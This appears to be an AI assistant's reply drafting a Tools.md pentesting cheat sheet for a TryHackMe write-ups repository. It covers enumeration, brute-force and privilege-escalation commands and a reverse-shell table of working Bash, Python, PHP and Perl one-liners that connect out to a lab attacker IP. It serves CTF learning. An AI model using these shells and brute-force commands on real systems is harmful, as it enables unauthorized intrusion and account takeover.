Absolutely! Here’s a **clean, well-organized, and professional `Tools.md`** for your `tryhackme-writeups` repo. It includes commonly used tools, one-liners, payloads, and cheat sheets categorized for easy reference.

---

### 📄 `Tools.md`

```markdown
# 🧰 Pentesting Tools, Payloads & One-Liners

A curated list of tools, commands, and tips I use during CTFs and TryHackMe rooms. This document is constantly updated as I learn more and refine my methodology.

---

## 🕵️‍♂️ Enumeration

### 🔎 Nmap

```bash
nmap -sC -sV -oN nmap/basic <IP>
nmap -A -p- -oN nmap/full <IP>
```

### 🌐 Gobuster / Dirb

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
```

### 📜 Nikto

```bash
nikto -h http://<IP>
```

---

## 🛠️ Exploitation Tools

| Tool      | Use Case                    | Link                           |
|-----------|-----------------------------|--------------------------------|
| **sqlmap** | SQL injection automation    | https://sqlmap.org             |
| **hydra**  | Brute force login portals   | https://github.com/vanhauser-thc/thc-hydra |
| **wfuzz**  | Web fuzzing (parameters)    | https://github.com/xmendez/wfuzz |
| **searchsploit** | Find public exploits | https://github.com/offensive-security/exploitdb |

---

## 🧼 Privilege Escalation

### 🔍 LinEnum

```bash
bash LinEnum.sh > linenum_output.txt
```

### 🚀 Linux PE Scripts

- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LES (Linux Exploit Suggester)](https://github.com/mzet-/linux-exploit-suggester)

---

## 🪪 Password Attacks

```bash
hydra -l admin -P rockyou.txt <ip> http-get /admin
john --wordlist=rockyou.txt hash.txt
```

---

## 🐍 Python & Scripting

### Simple HTTP Server

```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000
```

### Interactive Reverse Shell (Bash)

```bash
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```

---

## 📂 File Transfers

```bash
# Python HTTP Server
python3 -m http.server 8080

# Netcat
nc -nlvp 1234 > received_file
```

---

## 🔁 Reverse Shell Cheatsheet

| Language | Payload |
|---------|---------|
| Bash | `bash -i >& /dev/tcp/10.10.14.1/4444 0>&1` |
| Python | `python -c 'import socket,subprocess,os; s=socket.socket(); s.connect(("10.10.14.1",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh"])'` |
| PHP | `php -r '$sock=fsockopen("10.10.14.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| Perl | `perl -e 'use Socket;$i="10.10.14.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |

More: [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 🧠 Wordlists

| Name           | Description                          | Path/Source                         |
|----------------|--------------------------------------|-------------------------------------|
| rockyou.txt    | Common passwords                     | `/usr/share/wordlists/rockyou.txt` |
| SecLists       | Directories, usernames, fuzzing, etc | https://github.com/danielmiessler/SecLists |

---

## 📖 Cheatsheets

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [HackTricks](https://book.hacktricks.xyz/)

---

## 📌 Note

This is a live document that grows as I encounter new tools or techniques during CTFs and real-world labs. Contributions and suggestions are always welcome.

> 📚 **Hack to Learn — Not to Harm**
```

---

Let me know if you want a **PDF version** of this, or I can even **auto-generate the file structure for your repo** with all placeholders included.
